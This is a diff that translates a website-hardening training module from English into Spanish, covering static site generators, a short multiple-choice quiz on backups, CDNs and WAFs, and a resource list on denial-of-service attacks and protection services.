-Some static site generators have their own simple structure for site content, generally relying on a bunch of Markdown files, some HTML styling templates, and some configuration files. However, many content-management systems will use a static site generator on the backend to produce the final web site. Of course, it’s also possible to just maintain the source files in git or the like. In any case, site owners will make changes to the web site configuration, then generate, test, and upload the full static site for every change. Examples of some popular standalone static site generators include [Hugo](https://gohugo.io/) and [Jekyll](https://jekyllrb.com/). For content management, examples of CMSes that use static site generators include [Cloud Cannon](https://cloudcannon.com/jamstack-ecosystem/static-site-generators/) or [Static CMS](https://www.staticcms.org/docs/add-to-your-site).
+Algunos generadores de sitios estáticos tienen su propia estructura simple para el contenido del sitio, y generalmente se basan en un montón de archivos Markdown, algunas plantillas de estilo HTML y algunos archivos de configuración. Sin embargo, muchos sistemas de gestión de contenidos utilizarán un generador de sitios estáticos en el backend para producir el sitio web final. Por supuesto, también es posible mantener simplemente los archivos fuente en git o algo similar. En cualquier caso, los propietarios del sitio realizarán cambios en la configuración del sitio web y luego generarán, probarán y cargarán el sitio estático completo para cada cambio. Ejemplos de algunos generadores de sitios estáticos independientes populares incluyen [Hugo](https://gohugo.io/) y [Jekyll](https://jekyllrb.com/). Para la gestión de contenidos, ejemplos de CMS que utilizan generadores de sitios estáticos incluyen [Cloud Cannon](https://cloudcannon.com/jamstack-ecosystem/static-site-generators/) o [Static CMS](https://www.staticcms.org/docs/add-to-your-site).
 
-The downside of migrating to a static web site generator like Hugo or Jekyll is that you have to migrate your existing content. For websites using a different CMS, this can be a lot of work. It may be possible to use a static site generator for your existing platform, though. One popular example is [WP2Static](https://wp2static.com/), an [open-source](https://github.com/elementor/wp2static) WordPress plugin that will turn a WordPress site into a static one. There’s still migration that may be needed, [contact forms](https://wp2static.com/docs/basics/contact-forms-for-static-sites/) will need to be changed, and will need to be migrated to a 3rd party service like [Disqus](https://help.disqus.com/en/articles/1717131-importing-comments-from-wordpress), [ReplyBox](https://getreplybox.com/docs/importing-wordpress-comments/), or many others. Note that using a 3rd party commenting service will put another party in control of your site users’ comments.
+La desventaja de migrar a un generador de sitios web estáticos como Hugo o Jekyll es que tienes que migrar tu contenido existente. Para sitios web que utilizan un CMS diferente, esto puede suponer mucho trabajo. Sin embargo, es posible utilizar un generador de sitios estáticos para su plataforma existente. Un ejemplo popular es [WP2Static](https://wp2static.com/), un complemento de WordPress de [fuente abierta](https://github.com/elementor/wp2static) que convertirá un sitio de WordPress en uno estático. Todavía es posible que sea necesaria una migración, los [formularios de contacto](https://wp2static.com/docs/basics/contact-forms-for-static-sites/) deberán cambiarse y deberán migrarse a un servicio de terceros como [Disqus](https://help.disqus.com/en/articles/1717131-importing-comments-from-wordpress), [ReplyBox](https://getreplybox.com/docs/importing-wordpress-comments/), o muchos otros. Tenga en cuenta que el uso de un servicio de comentarios de terceros permitirá que otra parte tenga el control de los comentarios de los usuarios de su sitio.
 
-## Learning Resources
+## Verificación de Habilidades
 
-{{% resource title="Ping flood" languages="English, Chinese, Japanese, Russian, Ukrainian, Greek, Indonesian, Catalan, Spanish, French, Italian, Dutch, Polish, Portuguese, Turkish, Czech" cost="Free" description="A description of a common denial of service attack." url="https://en.wikipedia.org/wiki/Ping_flood" %}}
+El fortalecimiento de sitios web desempeña un papel fundamental en la protección de los activos en línea contra diversas amenazas cibernéticas. Este conjunto de desafiantes preguntas de opción múltiple explora los conceptos centrales del fortalecimiento de sitios web, centrándose en estrategias y tecnologías clave destinadas a mejorar la resiliencia de las aplicaciones web frente a vulnerabilidades comunes. Desde los procesos de desarrollo y mantenimiento que garantizan la disponibilidad del sitio hasta la implementación de redes de entrega de contenido (CDN) y generadores de sitios estáticos, estas preguntas profundizan en las complejidades de fortalecer los sitios web contra los intentos de piratería.
 
-{{% resource title="Smurf attack" languages="English, Arabic, Farsi, Japanese, Korean, Greek, Indonesian, Catalan, German, Spanish, Basque, French, Italian, Lombard, Dutch, Polish, Portuguese, Slovenian, Finnish, Czech" cost="Free" description="A description of another common denial of service attack, includes examples and mitigations." url="https://en.wikipedia.org/wiki/Smurf_attack" %}}
+Pruebe sus conocimientos sobre las prácticas de protección de sitios web y obtenga información sobre las medidas esenciales para reforzar la postura de seguridad de sus plataformas en línea. Si es posible, analice sus respuestas a esas preguntas con un compañero o mentor que le ayudará a verificar que haya comprendido correctamente el tema.
 
-{{% resource title="NTP amplification attack" languages="English, German, Spanish, French, Italian, Japanese, Korean, Portuguese, Chinese, Taiwanese" cost="Free" description="An overview of how the network time protocol (NTP) could be abused for denial of service attacks." url="https://www.cloudflare.com/learning/ddos/ntp-amplification-ddos-attack/" %}}
+1. ¿Qué proceso de desarrollo y mantenimiento garantiza que se pueda recrear un sitio web si los servidores de alojamiento de producción no están disponibles?
 
-{{% resource title="Ping of death" languages="English, Arabic, Farsi, Chinese, Japanese, Korean, Bulgarian, Russian, Ukrainian, Greek, Azeri, Indonesian, German, Spanish, French, Italian, Dutch, Polish, Portuguese, Romanian, Czech, Hebrew" cost="Free" description="An attack in which a computer is overwhelmed by a malicious ping." url="https://en.wikipedia.org/wiki/Ping_of_death" %}}
+A) Actualizar periódicamente los complementos y temas del sitio web\
+B) Implementación de autenticación multifactor para cuentas de administrador\
+C) Utilizar sistemas de control de versiones y copias de seguridad automatizadas\
+D) Hacer cumplir políticas estrictas de contraseñas para las cuentas de usuario
 
-{{% resource title="Algorithmic Complexity Attacks and the Linux Networking Code" languages="English" cost="Free" description="A look at how Linux handles networking and a specific attack that could be directed against it." url="https://www.enyo.de/fw/security/notes/linux-dst-cache-dos.html" %}}
+{{< question title="Respuesta correcta" >}}
+C) Utilizar sistemas de control de versiones y copias de seguridad automatizadas
 
-{{% resource title="What is slow HTTP post DOS attack?" languages="English" cost="Free" description="An overview of a denial of service attack which exploits some features in HTTP POST requests." url="https://www.educative.io/answers/what-is-slow-http-post-dos-attack" %}}
+Explicación: El uso de sistemas de control de versiones (como Git) y copias de seguridad automatizadas garantiza que el código base y los datos del sitio web se almacenen de forma segura y puedan restaurarse fácilmente en caso de fallas del servidor o pérdida de datos. Esta práctica ayuda a mantener la integridad del sitio web y minimiza el tiempo de inactividad.
+{{< /question >}}
 
-{{% resource title="Botnet" languages="48 languages" cost="Free" description="An overview of what a botnet is, or a group of automatically managed internet-connected devices used for malicious purposes." url="https://en.wikipedia.org/wiki/Botnet" %}}
+2. ¿Cómo puede una CDN (Red de entrega de contenidos) ayudar a proteger un sitio web de ataques de denegación de servicio (DoS)?
 
-{{% resource title="DDoS for hire" languages="English" cost="Free" description="A collection of blog posts by Brian Krebs on the DDoS for hire industry." url="https://krebsonsecurity.com/category/ddos-for-hire/" %}}
+A) Distribuyendo el contenido del sitio web en múltiples servidores para manejar los picos de tráfico.\
+B) Cifrando todos los datos transmitidos entre el servidor y el cliente.\
+C) Proporcionando capas adicionales de autenticación para los inicios de sesión de los usuarios\
+D) Bloqueando automáticamente el acceso a direcciones IP sospechosas
 
-{{% resource title="Targeted sophisticated phishing attacks against dissidents in Azerbaijan is trending" languages="English" cost="Free" description="A 2020 Qurium report about an attacker who broke into a website and then used the data to phish dissidents." url="https://www.qurium.org/alerts/targeted-sophisticated-phishing-attacks-against-dissidents-in-azerbaijan-is-trending/" %}}
+{{< question title="Respuesta correcta" >}}
+A) Distribuyendo el contenido del sitio web en múltiples servidores para manejar los picos de tráfico.
 
-{{% resource title="Deflect for nonprofits" languages="English" cost="Free" description="Deflect is a DDoS protection program which allows nonprofits to sign up for free." url="https://deflect.ca/non-profits/" %}}
+Explicación: Una CDN (Red de Entrega de Contenido) ayuda a proteger un sitio web de ataques DoS al distribuir su contenido en múltiples servidores ubicados en varias ubicaciones geográficas. Esta distribución ayuda a distribuir la carga de tráfico entrante, reduciendo el impacto de los ataques DoS y garantizando que el sitio web permanezca accesible para los usuarios incluso durante períodos de mucho tráfico.
+{{< /question >}}
 
-{{% resource title="Google Project Shield" languages="English" cost="Free" description="A free DDoS protection service for news, human rights, and election-related sites." url="https://projectshield.withgoogle.com/landing" %}}
+3. ¿Qué tecnología puede mejorar la resistencia de un sitio web a DoS (denegación de servicio) y a la piratería al ofrecer páginas HTML pre-renderizadas a los usuarios?
 
-{{% resource title="Cloudflare Project Galileo" languages="English, German, Spanish, French, Italian, Japanese, Korean, Portuguese, Chinese, Taiwanese" cost="Free" description="Pre DDoS protection and other security measures for at-risk sites, including artistic groups, humanitarian organizations, and political dissidents." url="https://www.cloudflare.com/galileo/" %}}
+A) Plataformas informáticas sin servidor\
+B) Estructuras dinámicas de aplicaciones web\
+C) Sistemas de Gestión de Contenidos (CMS)\
+D) Generadores de sitios estáticos
 
-{{% resource title="Secure hosting for at risk sites" languages="English" cost="Varied, depending on hosting package" description="Qurium and Greenhost both offer hosting for groups which might be at risk of attacks due to their human rights and media work." url="Qurium: https://www.qurium.org/secure-hosting/" url2="Greenhost: https://greenhost.net/internet-freedom/" %}}
 
-{{% resource title="Web application firewalls" languages="English" cost="Varied" description="Network devices that sit between an end user and a website’s origin server, like a CDN, providing an additional layer of security." url="Sucuri: https://sucuri.net/website-firewall/" url2="Wordfence: https://www.wordfence.com/products/pricing/" url3="ModSecurity: https://github.com/SpiderLabs/ModSecurity" %}}
+{{< question title="Respuesta correcta" >}}
+D) Generadores de sitios estáticos
 
-{{% resource title="Web application hardeners" languages="English" cost="Varied, many free options" description="Automated tools which find potential vulnerabilities in web applications." url="A hardening framework: https://dev-sec.io/baselines/" url2="Snuffleupagus: https://snuffleupagus.readthedocs.io/" %}}
+Explicación: Los generadores de sitios estáticos crean sitios web generando páginas HTML a partir de archivos fuente durante el proceso de construcción. Dado que los sitios estáticos no dependen del procesamiento del lado del servidor ni de bases de datos, son inherentemente más resistentes a la piratería y los ataques DoS. Los sitios estáticos también suelen ser más rápidos de cargar y más fáciles de almacenar en caché, lo que mejora aún más su resistencia a los ataques.
+{{< /question >}}
 
-{{% resource title="Static site generators" languages="English" cost="Free" description="An overview of major static site generators." url="https://cloudcannon.com/jamstack-ecosystem/static-site-generators/" %}}
+4. ¿Cómo contribuyen los fortalecedores de configuración y los WAF (Web Application Firewalls) a hacer que un sitio web sea más resistente a la piratería?
 
-{{% resource title="WP2Static" languages="English" cost="Free" description="A WordPress plugin to generate static sites." url="https://wp2static.com/" %}}
+A) Optimizando el rendimiento del servidor y el uso de recursos\
+B) Implementando capas adicionales de autenticación para los inicios de sesión de los usuarios\
+C) Detectando y bloqueando automáticamente patrones de ataque conocidos y tráfico sospechoso\
+D) Cifrando todos los datos transmitidos entre el servidor y el cliente
 
-## Skill Check
+{{< question title="Respuesta correcta" >}}
+C) Detectando y bloqueando automáticamente patrones de ataque conocidos y tráfico sospechoso
 
-Website hardening plays a critical role in safeguarding online assets against various cyber threats. This set of challenging multiple-choice questions explores the core concepts of website hardening, focusing on key strategies and technologies aimed at enhancing the resilience of web applications against common vulnerabilities. From development and maintenance processes ensuring site availability to the implementation of content delivery networks (CDNs) and static site generators, these questions delve into the intricacies of fortifying websites against hacking attempts.
+Explicación: Los fortalecedores de configuración y los WAF (Cortafuegos de Aplicaciones Web) ayudan a que un sitio web sea más resistente a la piratería al detectar y bloquear automáticamente patrones de ataque conocidos y tráfico sospechoso. Estas medidas de seguridad actúan como una barrera entre el sitio web y los posibles atacantes, filtrando las solicitudes entrantes y el tráfico para evitar actividades maliciosas y accesos no autorizados.
+{{< /question >}}
 
-Test your knowledge of website hardening practices and gain insights into the essential measures to bolster the security posture of your online platforms.If possible, discuss your answers to those questions with a peer or Mentor who will help verify that you’ve correctly understood the topic.
+## Recursos de Aprendizaje
 
-1. What development and maintenance process ensure a website can be recreated if production hosting servers are unavailable?
+{{% resource title="Inundación de ping" description="Una descripción de un ataque común de denegación de servicio" languages="Inglés, chino, japonés, ruso, ucraniano, griego, indonesio, catalán, español, francés, italiano, holandés, polaco, portugués, turco, checo" cost="Gratis" url="https://es.wikipedia.org/wiki/Ping_flood" %}}
 
-A) Regularly updating website plugins and themes\
-B) Implementing multi-factor authentication for admin accounts\
-C) Using version control systems and automated backups\
-D) Enforcing strict password policies for user accounts
+{{% resource title="Ataque Smurf" description="Una descripción de otro ataque común de denegación de servicio, incluye ejemplos y mitigaciones." languages="Inglés, árabe, farsi, japonés, coreano, griego, indonesio, catalán, alemán, español, euskera, francés, italiano, lombardo, holandés, polaco, portugués, esloveno, finlandés, checo" cost="Gratis" url="https://es.wikipedia.org/wiki/Ataque_pitufo" %}}
 
-2. How can a CDN (Content Delivery Network) help protect a website from Denial of Service (DoS) attacks?
+{{% resource title="Ataque de amplificación NTP" description="Una descripción general de cómo se podría abusar del protocolo de tiempo de red (NTP) para ataques de denegación de servicio" languages="Inglés, alemán, español, francés, italiano, japonés, coreano, portugués, chino, taiwanés" cost="Gratis" url="https://www.cloudflare.com/es-la/learning/ddos/ntp-amplification-ddos-attack/" %}}
 
-A) By distributing website content across multiple servers to handle traffic spikes\
-B) By encrypting all data transmitted between the server and client\
-C) By providing additional layers of authentication for user logins\
-D) By automatically blocking access to suspicious IP addresses
+{{% resource title="Ping de la muerte" description="Un ataque en el que una computadora se ve abrumada por un ping malicioso." languages="Inglés, árabe, farsi, chino, japonés, coreano, búlgaro, ruso, ucraniano, griego, azerí, indonesio, alemán, español, francés, italiano, holandés, polaco, portugués, rumano, checo, hebreo" cost="Gratis" url="https://es.wikipedia.org/wiki/Ping_de_la_muerte" %}}
 
-3. Which technology can enhance a website's resistance to DoS (Denial of Service) and hacking by serving pre-rendered HTML pages to users?
+{{% resource title="Ataques de complejidad algorítmica y el Código de Red de Linux" description="Una mirada a cómo Linux maneja las redes y un ataque específico que podría dirigirse contra él" languages="Inglés" cost="Gratis" url="https://www.enyo.de/fw/security/notes/linux-dst-cache-dos.html" %}}
 
-A) Serverless computing platforms\
-B) Dynamic web application frameworks\
-C) Content Management Systems (CMS)\
-D) Static site generators
+{{% resource title="¿Qué es un ataque DOS de HTTP post lento?" description="Una descripción general de un ataque de denegación de servicio que explota algunas características de las solicitudes HTTP POST (las solicitudes se envían lo suficientemente lento como para que el servidor tenga que procesarlas, pero no lo suficientemente lento como para activar tiempos de espera)." languages="Inglés" cost="Gratis" url="https://www.educative.io/answers/what-is-slow-http-post-dos-attack" %}}
 
-4. How do configuration hardeners and WAFs (Web Application Firewalls) contribute to making a website more resistant to hacking?
+{{% resource title="Botnet" description="Una descripción general de lo que utiliza una botnet o un grupo de dispositivos conectados a Internet administrados automáticamente con fines maliciosos" languages="48 idiomas" cost="Gratis" url="https://es.wikipedia.org/wiki/Botnet" %}}
 
-A) By optimizing server performance and resource usage\
-B) By implementing additional layers of authentication for user logins\
-C) By automatically detecting and blocking known attack patterns and suspicious traffic\
-D) By encrypting all data transmitted between the server and client
+{{% resource title="DDoS para contratar" description="Una colección de publicaciones de blog de Brian Krebs sobre la industria de contratación de DDoS" languages="Inglés" cost="Gratis" url="https://krebsonsecurity.com/category/ddos-for-hire/" %}}
 
-Correct answers and explanations:
+{{% resource title="Los ataques de phishing sofisticados y dirigidos contra disidentes en Azerbaiyán son tendencia" description="Un informe de Qurium de 2020 sobre un atacante que irrumpió en un sitio web y luego utilizó los datos para realizar phishing a disidentes." languages="Inglés" cost="Gratis" url="https://www.qurium.org/alerts/targeted-sophisticated-phishing-attacks-against-dissidents-in-azerbaijan-is-trending/" %}}
 
-1. Correct Answer: C) Using version control systems and automated backups
+{{% resource title="Deflect para organizaciones sin fines de lucro" description="Deflect es un programa de protección DDoS que permite a las organizaciones sin fines de lucro registrarse de forma gratuita" languages="Inglés" cost="Gratis" url="https://deflect.ca/non-profits/" %}}
 
-Explanation: Using version control systems (such as Git) and automated backups ensures that the website's codebase and data are securely stored and can be easily restored in case of server failures or data loss. This practice helps maintain the integrity of the website and minimizes downtime.
+{{% resource title="Google Project Shield" description="Un servicio gratuito de protección DDoS para sitios de noticias, derechos humanos y relacionados con las elecciones" languages="Inglés" cost="Gratis" url="https://projectshield.withgoogle.com/landing?hl=es-419" %}}
 
-2. Correct Answer: A) By distributing website content across multiple servers to handle traffic spikes
+{{% resource title="Proyecto de Cloudflare Galileo" description="Protección previa a DDoS y otras medidas de seguridad para sitios en riesgo, incluidos grupos artísticos, organizaciones humanitarias y disidentes políticos." languages="Inglés, alemán, español, francés, italiano, japonés, coreano, portugués, chino, taiwanés" cost="Gratis" url="https://www.cloudflare.com/es-la/galileo/" %}}
 
-Explanation: A CDN (Content Delivery Network) helps protect a website from DoS attacks by distributing its content across multiple servers located in various geographic locations. This distribution helps distribute the incoming traffic load, reducing the impact of DoS attacks and ensuring that the website remains accessible to users even during periods of high traffic.
+{{% resource title="Alojamiento seguro para sitios en riesgo: Qurium" description="Qurium y Greenhost ofrecen alojamiento para grupos que podrían estar en riesgo de sufrir ataques debido a su trabajo en materia de derechos humanos y medios de comunicación." languages="Inglés" cost="Variado, dependiendo del paquete de alojamiento" url="Qurium: https://www.qurium.org/secure-hosting/" %}}
 
-3. Correct Answer: D) Static site generators
+{{% resource title="Alojamiento seguro para sitios en riesgo: Greenhost" description="Qurium y Greenhost ofrecen alojamiento para grupos que podrían estar en riesgo de sufrir ataques debido a su trabajo en materia de derechos humanos y medios de comunicación." languages="Inglés" cost="Variado, dependiendo del paquete de alojamiento" url="Greenhost: https://greenhost.net/internet-freedom/" %}}
 
-Explanation: Static site generators create websites by generating HTML pages from source files during the build process. Since static sites do not rely on server-side processing or databases, they are inherently more resistant to hacking and DoS attacks. Static sites are also typically faster to load and easier to cache, further enhancing their resilience to attacks.
+{{% resource title="Firewalls de aplicaciones web: Sucuri" description="Dispositivos de red que se encuentran entre un usuario final y el servidor de origen de un sitio web, como una CDN, lo que proporciona una capa adicional de seguridad." languages="Inglés" cost="Variado" url="Sucuri: https://sucuri.net/website-firewall/" %}}
 
-4. Correct Answer: C) By automatically detecting and blocking known attack patterns and suspicious traffic
+{{% resource title="Firewalls de aplicaciones web: Wordfence" description="Dispositivos de red que se encuentran entre un usuario final y el servidor de origen de un sitio web, como una CDN, lo que proporciona una capa adicional de seguridad." languages="Inglés" cost="Variado" url="Wordfence: https://www.wordfence.com/products/pricing/" %}}
 
-_Explanation: Configuration hardeners and WAFs (Web Application Firewalls) help make a website more resistant to hacking by automatically detecting and blocking known attack patterns and suspicious traffic. These security measures act as a barrier between the website and potential attackers, filtering incoming requests and traffic to prevent malicious activities and unauthorized access._
+{{% resource title="Firewalls de aplicaciones web: ModSecurity" description="Dispositivos de red que se encuentran entre un usuario final y el servidor de origen de un sitio web, como una CDN, lo que proporciona una capa adicional de seguridad." languages="Inglés" cost="Variado" url="ModSecurity: https://github.com/SpiderLabs/ModSecurity" %}}
+
+{{% resource title="Fortalecedores de aplicaciones web" description="Un framework de fortificación" languages="Inglés" cost="Gratis" url="https://dev-sec.io/baselines/" %}}
+
+{{% resource title="Fortalecedores de aplicaciones web: Snuffleupagus" description="Herramientas automatizadas que encuentran posibles vulnerabilidades en aplicaciones web." languages="Inglés" cost="Gratis" url="https://snuffleupagus.readthedocs.io/" %}}
+
+{{% resource title="Generadores de sitios estáticos" description="Una descripción general de los principales generadores de sitios estáticos" languages="Inglés" cost="Gratis" url="https://cloudcannon.com/jamstack-ecosystem/static-site-generators/" %}}
+
+{{% resource title="WP2Static" description="Un complemento de WordPress para generar sitios estáticos" languages="Inglés" cost="Gratis" url="https://wp2static.com/" %}}
